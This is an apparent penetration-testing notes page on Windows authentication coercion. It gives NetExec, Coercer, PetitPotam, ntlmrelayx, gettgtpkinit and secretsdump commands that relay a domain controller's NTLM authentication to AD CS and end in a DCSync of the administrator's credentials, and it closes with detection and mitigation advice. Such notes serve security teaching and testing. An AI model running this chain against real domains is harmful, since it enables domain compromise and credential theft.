---
tags:
  - "#type/technique"
  - "#tactic/TA0006"
  - "#technique/T1187"
  - "#stage/credential-access"
  - "#os/windows"
  - "#tool/netexec"
  - "#tool/impacket"
  - "#tool/coercer"
  - "#protocol/ntlm"
aliases:
  - Authentication Coercion
  - Forced Authentication
  - PetitPotam
  - PrinterBug
  - Shadow Coerce
---

## Technique
___

Authentication Coercion is a technique that forces Windows systems (typically servers or domain controllers) to initiate authentication to an attacker-controlled system. This coerced authentication can then be captured or relayed to access other services or systems.

The attack exploits various Microsoft protocols and APIs that can be abused to trigger NTLM authentication, including:
- MS-EFSRPC (Encrypting File System Remote Protocol) - PetitPotam
- MS-RPRN (Print System Remote Protocol) - PrinterBug
- MS-FSRVP (File Server Remote VSS Protocol) - ShadowCoerce
- Many others across various Windows services

These attacks are particularly dangerous when combined with NTLM relay attacks, especially against Active Directory Certificate Services (AD CS).

## Prerequisites
___

**Access Level:** Many coercion methods require network access but no authentication, though some methods require low-privilege authenticated access.

**System State:** 
- Target must have the vulnerable service or API enabled
- NTLM authentication must be enabled in the environment
- For effective exploitation via relay: SMB signing must be disabled on target systems

## Multi-Method Coercion
___

**Using Coercer**

[Coercer](https://github.com/p0dalirius/Coercer) attempts 12 different methods to coerce authentication:

```bash
python3 coercer.py coerce -l <attackerIP> -t <targetIP> -u 'user' -p 'pass' -d <domain.local> -v
```

## PetitPotam (MS-EFSRPC)
___

PetitPotam is one of the most reliable authentication coercion techniques, exploiting the Encrypting File System Remote Protocol.

### Requirements

| Feature / Component       | Required for PetitPotam | Required for Full Relay to DA via AD CS |
| ------------------------- | ----------------------- | --------------------------------------- |
| EFSRPC                    | ✅ Yes                   | ✅ Yes                                   |
| NTLM Enabled              | ✅ Yes                   | ✅ Yes                                   |
| SMB/LDAP Signing Disabled | ✅ Yes (on relay target) | ✅ Yes (on certsrv or LDAP)              |
| AD CS Installed           | ❌ No                    | ✅ Yes                                   |
| Vulnerable AD CS Template | ❌ No                    | ✅ Yes                                   |
| EPA / Channel Binding Off | ❌ No                    | ✅ Yes                                   |

### Identification

Using NetExec:
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
```

Shorthand:
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o M=pe
```

### Exploitation with NTLM Relay to AD CS

1. Start ntlmrelayx to relay authentication to AD CS:
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://CA01.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
```

2. Coerce authentication from the domain controller:
```bash
python3 PetitPotam.py <attackerIP> <DCIP>
```

Or using NetExec:
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> M=pe
```

3. If successful, ntlmrelayx will output a base64 encoded certificate.

4. Use the certificate to request a Kerberos TGT for the domain controller:
```bash
python3 gettgtpkinit.py DOMAIN.LOCAL/DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

5. Set the Kerberos environment variable:
```bash
export KRB5CCNAME=dc01.ccache
```

6. Perform DCSync to extract credentials:
```bash
impacket-secretsdump -just-dc-user DOMAIN/administrator -k -no-pass "DC01$"@DC01.DOMAIN.LOCAL
```

## Other Coercion Methods
___

### PrinterBug (MS-RPRN)

Exploits the Print System Remote Protocol:
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PrinterBug
```

### ShadowCoerce (MS-FSRVP)

Exploits the File Server Remote VSS Protocol:
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=ShadowCoerce
```

### WebClient Service Coercion

Exploits the WebClient service to force a connection:
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=WebClient
```

## Detection & Mitigation
___

### Detection

- Monitor for unexpected authentication attempts from servers and domain controllers
- Look for Event ID 4624 (logon) and 4625 (failed logon) events from critical servers to unusual destinations
- Watch for RPC calls to suspicious or unusual endpoints
- Monitor for exploitation of specific protocol methods associated with coercion attacks

### Mitigation

- Apply Microsoft's security updates that address specific coercion vulnerabilities
- Enable Extended Protection for Authentication (EPA) and channel binding
- Enforce SMB signing across the environment, especially on domain controllers
- Block or restrict access to vulnerable RPC endpoints
- Disable NTLM authentication where possible in favor of Kerberos
- For AD CS relay attacks:
  - Configure certificate templates to require stronger authentication
  - Enable HTTPS on Certificate Authority Web Enrollment
  - Implement network segmentation to isolate critical servers